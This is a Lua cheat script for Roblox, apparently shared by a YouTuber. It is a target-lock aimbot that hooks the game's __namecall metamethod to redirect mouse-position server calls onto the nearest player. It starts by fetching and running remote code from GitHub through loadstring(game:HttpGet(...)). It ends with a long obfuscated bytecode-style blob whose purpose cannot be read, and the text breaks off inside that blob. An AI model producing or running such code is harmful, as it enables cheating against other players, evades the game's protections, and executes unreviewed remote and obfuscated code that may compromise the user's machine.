--[[

This script wasn't protected because it was made very hard to read by the person who created it. 
I had to fix a lot of mistakes, 
and all other locks use this same bad script. It's very hard to understand.

modified by me / aka TheRealX_ORA on YT

-TheRealX_ORA
]]--

Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro2/main/ui2"))()
local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
NotifyLib.prompt('Rainbow Sun', 'Modified & Created By: TheRealX_ORA on YT', 5)

-- Service
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:service("VirtualInputManager")

-- User Input Variables
local isTouchEnabled = UserInputService.TouchEnabled
local isMouseEnabled = UserInputService.MouseEnabled
local isKeyboardEnabled = UserInputService.KeyboardEnabled
local isGamepadEnabled = UserInputService.GamepadEnabled

if isTouchEnabled then
    
    NotifyLib.prompt('Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)
    
elseif isMouseEnabled and isMouseEnabled then
    NotifyLib.prompt('Pc Device Detected', 'Smite them with Q!', 5)
    
elseif isGamepadEnabled and isTouchEnabled then
    
    NotifyLib.prompt('Controller And Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Controller And Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)

elseif isMouseEnabled and isMouseEnabled and isTouchEnabled then
    
    NotifyLib.prompt('Hybird Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Hybird Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)
end

Settings = {   
    rewrittenmain = {
		Enabled = true,
		Key = "q",
		DOT = true,
		AIRSHOT = true,
        NOTIF = true,			
        AUTOPRED = true,			
        FOV = math.huge,		
        RESOVLER = false
    }
}

local SelectedPart = "HumanoidRootPart"
local Prediction = true
local PredictionValue = 0.1357363


local AnchorCount = 0
local MaxAnchor = 50

local CC = game:GetService("Workspace").CurrentCamera
local Plr;
local enabled = false
local accomidationfactor = 0.136
local mouse = game.Players.LocalPlayer:GetMouse()
local data = game.Players:GetPlayers()

local placemarker = Instance.new("Part", game.Workspace)
placemarker.Material = Enum.Material.ForceField
placemarker.Reflectance = 0.1
placemarker.Shape = Enum.PartType.Ball
placemarker.TopSurface = Enum.SurfaceType.Smooth
placemarker.BottomSurface = Enum.SurfaceType.Smooth
placemarker.FrontSurface = Enum.SurfaceType.Smooth
placemarker.BackSurface = Enum.SurfaceType.Smooth
placemarker.LeftSurface = Enum.SurfaceType.Smooth
placemarker.RightSurface = Enum.SurfaceType.Smooth
        
local hue = 0

-- Update function to change the part's color over time
RunService.Heartbeat:Connect(function(deltaTime)
    hue = (hue + deltaTime * 0.1) % 1
    local color = Color3.fromHSV(hue, 1, 1)
    placemarker.Color = color
end)

function makemarker(Parent, Adornee, Color, Size, Size2)
    local e = Instance.new("BillboardGui", Parent)
    e.Name = "PP"			
    e.Adornee = Adornee			
    e.Size = UDim2.new(Size, Size2, Size, Size2)			
    e.AlwaysOnTop = Settings.rewrittenmain.DOT
    
    local a = Instance.new("Frame", e)			
    if Settings.rewrittenmain.DOT == true then				
        a.Size = UDim2.new(2, 0, 2, 0)
    else
		a.Size = UDim2.new(0, 0, 0, 0)
	end
    
	if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0				
        a.BackgroundTransparency = 0
	else
		a.Transparency = 1
		a.BackgroundTransparency = 1
	end
    
    a.BackgroundColor3 = Color
    local hue = 0
    
    -- Update function to change the part's color over time
    RunService.Heartbeat:Connect(function(deltaTime)
        hue = (hue + deltaTime * 0.1) % 1
        local color = Color3.fromHSV(hue, 1, 1)
        a.BackgroundColor3 = color
    end)
    
			
    local g = Instance.new("UICorner", a) 
		if Settings.rewrittenmain.DOT == false then
			g.CornerRadius = UDim.new(0, 0)
		else
			g.CornerRadius = UDim.new(1, 1) 
		end	
    
    return(e)
    
end

function noob(player)
    local character
    repeat wait() until player.Character
    local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(0, 0, 0), 0.3, 3)
    handler.Name = player.Name			
    player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
			
    spawn(function()			            
        while wait() do      
            if player.Character then
            end
		end
	end)
end

for i = 1, #data do
	if data[i] ~= game.Players.LocalPlayer then
		noob(data[i])
	end
end

game.Players.PlayerAdded:connect(function(Player)
	noob(Player)
end)

spawn(function()
	placemarker.Anchored = true
	placemarker.CanCollide = false
	
    if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(10, 10, 10)
    else
		placemarker.Size = Vector3.new(0, 0, 0)
	end
        
	placemarker.Transparency = 0.50
			
    if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(255, 0, 0), 0.40, 0)
	end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
    if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
        if enabled == true then
            enabled = false

            if Settings.rewrittenmain.NOTIF == true then
                Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Unlocked",
                    Text = "Spared: "..tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 1.5
                })
            end
        else
            Plr = getClosestPlayerToCursor()
            enabled = true
            if Settings.rewrittenmain.NOTIF == true then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Locked",
                    Text = "Victim: "..tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 2.5
                })
            end
        end
    end
end)



function getClosestPlayerToCursor()
	local closestPlayer
    local shortestDistance = Settings.rewrittenmain.FOV
	
    for i, v in pairs(game.Players:GetPlayers()) do			
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)					
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude	
            
            if magnitude < shortestDistance then						
                closestPlayer = v						
                shortestDistance = magnitude					
            end				
        end			
    end			
    return closestPlayer		
end

local lastNotificationTime = 0
local pingvalue = nil;
local split = nil;
local ping = nil;

local function generatePredictionValue(ping)
    local baseValues = {
        {maxPing = 10, base = 0.09},
        {maxPing = 30, base = 0.10},
        {maxPing = 50, base = 0.11},
        {maxPing = 70, base = 0.12},
        {maxPing = 90, base = 0.13},
        {maxPing = 110, base = 0.14},
        {maxPing = 130, base = 0.15},
        {maxPing = 150, base = 0.16},
        {maxPing = 170, base = 0.17},
        {maxPing = 190, base = 0.18},
        {maxPing = 210, base = 0.19},
        {maxPing = 230, base = 0.20},
        {maxPing = 250, base = 0.21},
        -- Add more if needed
    }

    local predictionGenerator = 0.22
    for _, range in ipairs(baseValues) do
        if ping <= range.maxPing then
            predictionGenerator = range.base
            break
        end
    end

    local numberOfDigits = math.random(12, 15)
    predictionGenerator = tostring(predictionGenerator)
    for _ = 1, numberOfDigits do
        local randomDigit = tostring(math.random(0, 9))
        predictionGenerator = predictionGenerator .. randomDigit
    end

    return predictionGenerator
end

local lastNotificationTime = 0
game:GetService("RunService").Stepped:connect(function()
    if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
        placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position + (Plr.Character.HumanoidRootPart.Velocity * accomidationfactor))
    else
        placemarker.CFrame = CFrame.new(0, 9999, 0)
    end
    if Settings.rewrittenmain.AUTOPRED == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue, '(')
        local ping = tonumber(split[1])

        local predictionValue = generatePredictionValue(ping)

        if tick() - lastNotificationTime >= 5 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Auto Prediction",
                Text = "Prediction: "..predictionValue,
                Duration = 2.5
            })
            lastNotificationTime = tick()
        end
    end
end)


local mt = getrawmetatable(game)
local old = mt.__namecall
		
setreadonly(mt, false)		
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if enabled and getnamecallmethod() == "FireServer" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then            
        if args[2] == "UpdateMousePos" then        
            
            if Prediction == true then            
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end
			end  
                
        elseif args[2] == "MOUSE" then
                
            if Prediction == true then
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
				if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end            
            end
                
        elseif args[2] == "MousePos" then
            if Prediction == true then
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
				if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end            
            end 
        end	            
        return old(unpack(args))			
    end			     
    return old(...)
end)

RunService.RenderStepped:Connect(function()		
    if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then	
           if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then					
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall

						
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
						AnchorCount = AnchorCount + 1
						if AnchorCount >= MaxAnchor then							                               
                            Prediction = false
							wait(2)
							AnchorCount = 0;							
                        end						
                    else
						Prediction = true
						AnchorCount = 0;
					end	                                               
                    SelectedPart = "LeftFoot"					                
                else						                
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
						AnchorCount = AnchorCount + 1
                        if AnchorCount >= MaxAnchor then
							Prediction = false
							wait(2)
							AnchorCount = 0;
						end          
                    else
						Prediction = true
						AnchorCount = 0;
					end
						SelectedPart = "HumanoidRootPart"
					end				                               
                else
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then						
                        AnchorCount = AnchorCount + 1
						if AnchorCount >= MaxAnchor then
							Prediction = false
							wait(2)
							AnchorCount = 0;
						end
					else
						Prediction = true
						AnchorCount = 0;
					end
			SelectedPart = "HumanoidRootPart"
		end
	else
		SelectedPart = "HumanoidRootPart"
	end
end)

NotifyLib.prompt('TheRealX_ORA', 'Loaded Rainbow Sun!', 5)

-- DO NOT DELETE THIS:
--[[

 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |              | || |     ____     | || |  _______     | || |      __      | |
| | |_  _||_  _| | || |              | || |   .'    `.   | || | |_   __ \    | || |     /  \     | |
| |   \ \  / /   | || |              | || |  /  .--.  \  | || |   | |__) |   | || |    / /\ \    | |
| |    > `' <    | || |              | || |  | |    | |  | || |   |  __ /    | || |   / ____ \   | |
| |  _/ /'`\ \_  | || |              | || |  \  `--'  /  | || |  _| |  \ \_  | || | _/ /    \ \_ | |
| | |____||____| | || |   _______    | || |   `.____.'   | || | |____| |___| | || ||____|  |____|| |
| |              | || |  |_______|   | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
Obfuscated by TheRealX_ORA on YT 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==4) then v28=nil;function v28(...)return {...},v12("#",...);end v29=nil;function v29()local v31=971 -(140 + 831) ;local v32;local v33;local v34;local v35;local v36;local v37;local v38;while true do if (v31~=2) then else v36=nil;v37=nil;v31=1853 -(1409 + 441) ;end if (v31==(718 -(15 + 703))) then local v88=0;local v89;while true do if (v88==(0 + 0)) then v89=438 -(262 + 176) ;while true do if (v89==(1721 -(345 + 1376))) then v32=688 -(198 + 490) ;v33=nil;v89=4 -3 ;end if (v89~=1) then else v31=1;break;end end break;end end end if (v31==(6 -3)) then v38=nil;while true do local v91=0;local v92;while true do if (v91==(1206 -(696 + 510))) then v92=0;while true do if (v92==0) then local v105=0 -0 ;while true do if (v105==0) then if (v32==(1264 -(1091 + 171))) then local v108=0;local v109;while true do if (v108~=0) then else v109=0;while true do local v246=0 + 0 ;while true do if (v246~=(0 -0)) then else if (v109==(3 -2)) then return v36;end if (v109==0) then local v324=374 -(123 + 251) ;local v325;while true do if (v324==(0 -0)) then v325=0;while true do if (1==v325) then v109=1;break;end if (v325==(698 -(208 + 490))) then for v351=1,v24() do local v352=0;local v353;local v354;while true do if ((1 + 0)==v352) then while true do if (0~=v353) then else v354=v22();if (v21(v354,1,1)~=(0 + 0)) then else local v358=836 -(660 + 176) ;local v359;local v360;local v361;local v362;local v363;while true do if (v358~=0) then else v359=0;v360=nil;v358=1 + 0 ;end if (v358==(203 -(14 + 188))) then v361=nil;v362=nil;v358=2;end if ((677 -(534 + 141))~=v358) then else v363=nil;while true do if (v359~=(1 + 1)) then else while true do if (v360==1) then local v366=0 + 0 ;local v367;while true do if (v366==(0 + 0)) then v367=0 -0 ;while true do if (v367~=0) then else local v375=0 -0 ;while true do if (v375~=(2 -1)) then else v367=1;break;end if (v375==0) then v363={v23(),v23(),nil,nil};if (v361==(0 -0)) then local v378=0;local v379;local v380;local v381;while true do if (v378==(1 + 0)) then v381=nil;while true do if (v379==1) then while true do if ((0 -0)==v380) then v381=0 -0 ;while true do if (v381==0) then v363[3]=v23();v363[4]=v23();break;end end break;end end break;end if (v379==0) then local v385=0;while true do if (v385==(867 -(550 + 317))) then v380=0 -0 ;v381=nil;v385=1;end if (1==v385) then v379=1;break;end end end end break;end if (v378==0) then v379=0 -0 ;v380=nil;v378=1;end end elseif (v361==1) then v363[8 -5 ]=v24();elseif (v361==(287 -(134 + 151))) then v363[1668 -(970 + 695) ]=v24() -(2^16) ;elseif (v361~=(5 -2)) then else local v386=0;local v387;local v388;while true do if (v386~=1) then else while true do if (v387==(1990 -(582 + 1408))) then v388=0;while true do if (v388==0) then v363[3]=v24() -((6 -4)^16) ;v363[4 -0 ]=v23();break;end end break;end end break;end if (v386==(0 -0)) then v387=1824 -(1195 + 629) ;v388=nil;v386=1 -0 ;end end end v375=1;end end end if (v367~=1) then else v360=243 -(187 + 54) ;break;end end break;end end end if ((780 -(162 + 618))==v360) then local v368=0;local v369;while true do if (v368~=(0 + 0)) then else v369=0;while true do if (v369~=(0 + 0)) then else v361=v21(v354,3 -1 ,4 -1 );v362=v21(v354,4,1 + 5 );v369=1637 -(1373 + 263) ;end if (v369==(1001 -(451 + 549))) then v360=1 + 0 ;break;end end break;end end end if (v360~=(2 -0)) then else local v370=0 -0 ;local v371;while true do if (v370==(1384 -(746 + 638))) then v371=0;while true do if (v371==1) then v360=2 + 1 ;break;end if (v371==0) then local v376=0;local v377;while true do if (v376~=(0 -0)) then else v377=341 -(218 + 123) ;while true do if (v377==(1582 -(1535 + 46))) then v371=1 + 0 ;break;end if (v377~=0) then else local v382=0;while true do if (v382==1) then v377=1 + 0 ;break;end if (v382==(560 -(306 + 254))) then if (v21(v362,1,1 + 0 )~=1) then else v363[3 -1 ]=v38[v363[2]];end if (v21(v362,1469 -(899 + 568) ,2 + 0 )==(2 -1)) then v363[606 -(268 + 335) ]=v38[v363[293 -(60 + 230) ]];end v382=573 -(426 + 146) ;end end end end break;end end end end break;end end end if (v360==(1 + 2)) then if (v21(v362,3,1459 -(282 + 1174) )==(812 -(569 + 242))) then v363[4]=v38[v363[11 -7 ]];end v33[v351]=v363;break;end end break;end if (v359~=0) then else local v364=0 + 0 ;while true do if (v364~=0) then else v360=1024 -(706 + 318) ;v361=nil;v364=1;end if (v364~=1) then else v359=1252 -(721 + 530) ;break;end end end if (v359~=(1272 -(945 + 326))) then else local v365=0 -0 ;while true do if (v365~=(0 + 0)) then else v362=nil;v363=nil;v365=1;end if ((701 -(271 + 429))==v365) then v359=2;break;end end end end break;end end end break;end end break;end if (v352==(0 + 0)) then v353=1500 -(1408 + 92) ;v354=nil;v352=1087 -(461 + 625) ;end end end for v355=1289 -(993 + 295) ,v24() do v34[v355-1 ]=v29();end v325=1;end end break;end end end break;end end end break;end end end if ((1 + 0)~=v32) then else local v110=0;local v111;while true do if ((1171 -(418 + 753))==v110) then v111=0 + 0 ;while true do if (v111==(0 + 0)) then v37=v24();v38={};v111=1 + 0 ;end if (v111==(1 + 1)) then v32=2;break;end if (v111~=1) then else local v284=0;while true do if (0==v284) then local v326=529 -(406 + 123) ;while true do if (v326==(1769 -(1749 + 20))) then for v343=1 + 0 ,v37 do local v344=1322 -(1249 + 73) ;local v345;local v346;local v347;while true do if (1==v344) then v347=nil;while true do if (v345==(0 + 0)) then v346=v22();v347=nil;v345=1;end if (1==v345) then if (v346==1) then v347=v22()~=0 ;elseif (v346==(1147 -(466 + 679))) then v347=v25();elseif (v346~=(6 -3)) then else v347=v26();end v38[v343]=v347;break;end end break;end if (v344==(0 -0)) then v345=1900 -(106 + 1794) ;v346=nil;v344=1;end end end v36[3]=v22();v326=1;end if (v326~=1) then else v284=1 + 0 ;break;end end end if ((1 + 0)==v284) then v111=5 -3 ;break;end end end end break;end end end v105=1;end if ((2 -1)==v105) then v92=115 -(4 + 110) ;break;end end end if (v92==1) then if ((584 -(57 + 527))==v32) then local v106=1427 -(41 + 1386) ;local v107;while true do if (0==v106) then v107=0;while true do if (v107==2) then v32=1;break;end if (v107==(104 -(17 + 86))) then v35={};v36={v33,v34,nil,v35};v107=2 -0 ;end if (v107==(0 -0)) then v33={};v34={};v107=1;end end break;end end end break;end end break;end end end break;end if (v31==(1 + 0)) then local v90=0;while true do if (v90~=(0 + 0)) then else v34=nil;v35=nil;v90=1;end if (v90==(1 -0)) then v31=67 -(30 + 35) ;break;end end end end end v18=5;end if (v18==2) then function v23()local v39=0 + 0 ;local v40;local v41;while true do if (v39==(1258 -(1043 + 214))) then return (v41 * (967 -711)) + v40 ;end if (v39==(320 -(53 + 267))) then v40,v41=v1(v16,v19,v19 + (1214 -(323 + 201 + 688)) );v19=v19 + (5 -3) ;v39=581 -(361 + 219) ;end end end v24=nil;function v24()local v42,v43,v44,v45=v1(v16,v19,v19 + (416 -(15 + 398)) );v19=v19 + (986 -(18 + 964)) ;return (v45 * 16777216) + (v44 * (246685 -181149)) + (v43 * (149 + 68 + 39)) + v42 ;end v25=nil;v18=3;end if (v18==3) then function v25()local v46=850 -(20 + 830) ;local v47;local v48;local v49;local v50;local v51;local v52;while true do if (v46==(3 + 0)) then if (v51==(126 -(116 + 10))) then if (v50==0) then return v52 * (0 -0) ;else local v104=0 + 0 ;while true do if (v104==(0 + 0)) then v51=739 -(542 + (434 -(64 + 174))) ;v49=0 -(0 + 0) ;break;end end end elseif (v51==(4387 -2340)) then return ((v50==(0 + (0 -0))) and (v52 * ((1 + 0)/(0 -0)))) or (v52 * NaN) ;end return v8(v52,v51-(369 + 654) ) * (v49 + (v50/((4 -2)^(133 -81)))) ;end if (v46==(1551 -(1126 + (761 -(144 + 192))))) then v47=v24();v48=v24();v46=(217 -(42 + 174)) + 0 ;end if (v46==((306 + 101) -(118 + 287))) then v51=v21(v48,21,23 + 8 );v52=((v21(v48,(104 + 21) -(40 + 53) )==(2 -1)) and  -(1122 -((1622 -(363 + 1141)) + 1003))) or ((1582 -(1183 + 397)) -1) ;v46=380 -((432 -290) + 235) ;end if (v46==(4 -3)) then v49=1131 -(369 + 761) ;v50=(v21(v48,1 + 0 ,(731 + 266) -(553 + 317 + 107) ) * ((3 -1)^32)) + v47 ;v46=2 + 0 ;end end end v26=nil;function v26(v53)local v54=1975 -(1913 + (186 -124)) ;local v55;local v56;while true do if (v54==(2 + 1)) then return v6(v56);end if (v54==2) then v56={};for v93=2 -1 , #v55 do v56[v93]=v2(v1(v3(v55,v93,v93)));end v54=3;end if (v54==(1933 -(565 + 1368))) then v55=nil;if  not v53 then local v101=0 -0 ;while true do if (v101==(1661 -(1477 + (488 -(244 + 60))))) then v53=v24();if (v53==0) then return "";end break;end end end v54=(1 + 0) -0 ;end if (v54==(1 + 0)) then v55=v3(v16,v19,(v19 + v53) -((1333 -(41 + 435)) -(564 + 292)) );v19=v19 + v53 ;v54=2 -(1001 -(938 + 63)) ;end end end v27=v24;v18=4;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v57)if (v1(v57,2)==79) then v20=v0(v3(v57,1,1));return "";else local v82=v2(v0(v57,16));if v20 then local v95=0;local v96;while true do if (v95==1) then return v96;end if (v95==0) then v96=v5(v82,v20);v20=nil;v95=1;end end else return v82;end end end);v21=nil;v18=1;end if (v18==5) then v30=nil;function v30(v58,v59,v60)local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...)local v68=v61;local v69=v62;local v70=v63;local v71=v28;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v83=0,v76 do if (v83>=v70) then v74[v83-v70 ]=v75[v83 + 1 ];else v78[v83]=v75[v83 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v84=0;while true do if (v84==0) then v80=v68[v72];v81=v80[1];v84=1;end if (v84==1) then if (v81<=30) then if (v81<=14) then if (v81<=6) then if (v81<=2) then if (v81<=0) then for v114=v80[2],v80[3] do v78[v114]=nil;end elseif (v81>1) then local v116=0;local v117;while true do if (0==v116) then v117=v80[2];v78[v117](v78[v117 + 1 ]);break;end end elseif (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=4) then if (v81==3) then v78[v80[2]]=v30(v69[v80[3]],nil,v60);else v78[v80[2]]=v78[v80[3]];end elseif (v81==5) then v78[v80[2]]=v80[3];else local v123=0;local v124;while true do if (v123==0) then v124=v80[2];do return v13(v78,v124,v73);end break;end end end elseif (v81<=10) then if (v81<=8) then if (v81>7) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else do return;end end elseif (v81==9) then local v125=0;local v126;local v127;local v128;while true do if (v125==0) then v126=v69[v80[3]];v127=nil;v125=1;end if (v125==1) then v128={};v127=v10({},{__index=function(v285,v286)local v287=0;local v288;while true do if (v287==0) then v288=v128[v286];return v288[1][v288[2]];end end end,__newindex=function(v289,v290,v291)local v292=v128[v290];v292[1][v292[2]]=v291;end});v125=2;end if (v125==2) then for v294=1,v80[4] do v72=v72 + 1 ;local v295=v68[v72];if (v295[1]==45) then v128[v294-1 ]={v78,v295[3]};else v128[v294-1 ]={v59,v295[3]};end v77[ #v77 + 1 ]=v128;end v78[v80[2]]=v30(v126,v127,v60);break;end end else local v129=v80[2];local v130={v78[v129](v13(v78,v129 + 1 ,v80[3]))};local v131=0;for v219=v129,v80[4] do v131=v131 + 1 ;v78[v219]=v130[v131];end end elseif (v81<=12) then if (v81>11) then local v132=0;local v133;while true do if (v132==0) then v133=v80[2];v78[v133]=v78[v133](v78[v133 + 1 ]);break;end end elseif  not v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end elseif (v81==13) then do return;end else v78[v80[2]][v80[3]]=v80[4];end elseif (v81<=22) then if (v81<=18) then if (v81<=16) then if (v81>15) then v78[v80[2]]=v59[v80[3]];else local v138=v80[3];local v139=v78[v138];for v222=v138 + 1 ,v80[4] do v139=v139   .. v78[v222] ;end v78[v80[2]]=v139;end elseif (v81==17) then local v141=0;local v142;local v143;while true do if (v141==0) then v142=v80[2];v143=v78[v142];v141=1;end if (v141==1) then for v297=v142 + 1 ,v80[3] do v7(v143,v78[v297]);end break;end end else local v144=v80[2];do return v78[v144](v13(v78,v144 + 1 ,v80[3]));end end elseif (v81<=20) then if (v81==19) then for v223=v80[2],v80[3] do v78[v223]=nil;end else local v145=0;local v146;while true do if (v145==0) then v146=v80[2];v78[v146]=v78[v146](v78[v146 + 1 ]);break;end end end elseif (v81>21) then local v147=0;local v148;local v149;local v150;while true do if (v147==1) then v150=0;for v298=v148,v80[4] do v150=v150 + 1 ;v78[v298]=v149[v150];end break;end if (v147==0) then v148=v80[2];v149={v78[v148](v78[v148 + 1 ])};v147=1;end end else v78[v80[2]]=v59[v80[3]];end elseif (v81<=26) then if (v81<=24) then if (v81==23) then local v153=v80[2];local v154={v78[v153](v78[v153 + 1 ])};local v155=0;for v225=v153,v80[4] do v155=v155 + 1 ;v78[v225]=v154[v155];end elseif ((v80[3]=="_ENV") or (v80[3]=="getfenv")) then v78[v80[2]]=v60;else v78[v80[2]]=v60[v80[3]];end elseif (v81>25) then local v156=0;local v157;local v158;while true do if (v156==0) then v157=v80[2];v158={};v156=1;end if (v156==1) then for v301=1, #v77 do local v302=0;local v303;while true do if (v302==0) then v303=v77[v301];for v329=0, #v303 do local v330=v303[v329];local v331=v330[1];local v332=v330[2];if ((v331==v78) and (v332>=v157)) then local v339=0;while true do if (v339==0) then v158[v332]=v331[v332];v330[1]=v158;break;end end end end break;end end end break;end end else local v159=0;local v160;while true do if (v159==0) then v160=v80[2];v78[v160]=v78[v160](v13(v78,v160 + 1 ,v80[3]));break;end end end elseif (v81<=28) then if (v81==27) then v78[v80[2]]=v30(v69[v80[3]],nil,v60);else v78[v80[2]][v80[3]]=v80[4];end elseif (v81==29) then local v164=v80[2];local v165=v78[v80[3]];v78[v164 + 1 ]=v165;v78[v164]=v165[v80[4]];else local v169=0;local v170;local v171;while true do if (v169==1) then for v304=1, #v77 do local v305=v77[v304];for v312=0, #v305 do local v313=0;local v314;local v315;local v316;while true do if (v313==1) then v316=v314[2];if ((v315==v78) and (v316>=v170)) then v171[v316]=v315[v316];v314[1]=v171;end break;end if (v313==0) then v314=v305[v312];v315=v314[1];v313=1;end end end end break;end if (v169==0) then v170=v80[2];v171={};v169=1;end end end elseif (v81<=45) then if (v81<=37) then if (v81<=33) then if (v81<=31) then local v112=0;local v113;while true do if (0==v112) then v113=v80[2];v78[v113](v78[v113 + 1 ]);break;end end elseif (v81==32) then v78[v80[2]]=v78[v80[3]][v80[4]];else v78[v80[2]]={};end elseif (v81<=35) then if (v81==34) then v78[v80[2]][v80[3]]=v78[v80[4]];else v72=v80[3];end elseif (v81>36) then local v178=0;local v179;local v180;local v181;while true do if (v178==1) then v181=0;for v306=v179,v80[4] do v181=v181 + 1 ;v78[v306]=v180[v181];end break;end if (v178==0) then v179=v80[2];v180={v78[v179](v13(v78,v179 + 1 ,v80[3]))};v178=1;end end else local v182=0;local v183;while true do if (v182==0) then v183=v78[v80[4]];if  not v183 then v72=v72 + 